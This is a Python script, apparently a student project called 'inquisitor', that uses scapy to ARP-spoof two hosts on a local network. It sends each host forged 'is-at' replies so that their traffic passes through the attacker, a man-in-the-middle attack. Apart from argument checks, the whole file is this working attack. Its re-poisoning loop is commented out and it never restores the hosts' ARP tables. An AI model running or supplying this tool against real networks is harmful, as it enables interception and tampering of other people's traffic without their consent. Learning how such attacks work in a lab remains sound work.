#!/usr/bin/python3
import argparse
import scapy.all as scapy
import re
import time

def error_exit(msg):
	print(f"Error: {msg}")
	exit(1)

def spoof(ip_target, mac_target, ip_src):
	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
	scapy.send(packet, verbose=0, count=7)
	print(f"[+] Sent to {ip_target} : {ip_src} is-at mac_mine")

def inquisitor(data):

	spoof(data.ip_target, data.mac_target, data.ip_src)
	spoof(data.ip_src, data.mac_src, data.ip_target)
	#while True:
	#	time.sleep(1)

def is_valid_ip(ip_str):
	try:
		nums = ip_str.split('.')
		if len(nums) != 4:
			return False
		for n in nums:
			if int(n) < 0 or 255 < int(n):
				return False
		return True
	except:
		return False

def is_valid_mac(mac_str):
	mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
	return bool(mac_pattern.match(mac_str))

def validate_args(args):
	try:
		if not is_valid_ip(args.ip_src):
			error_exit("Invalid IP-src")
		if not is_valid_mac(args.mac_src):
			error_exit("Invalid MAC-src")
		if not is_valid_ip(args.ip_target):
			error_exit("Invalid IP-target")
		if not is_valid_mac(args.mac_target):
			error_exit("Invalid MAC-target")
	except Exception as e:
		error_exit(e)

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip_src", type=str, help="IP-src")
	parser.add_argument("mac_src", type=str, help="MAC-src")
	parser.add_argument("ip_target", type=str, help="IP-target")
	parser.add_argument("mac_target", type=str, help="MAC-target")
	args = parser.parse_args()

	return args

def main():
	args = parse_args()
	validate_args(args)
	inquisitor(args)
	# except KeyboardInterrupt:

	print(args)

if __name__ == '__main__':
	main()
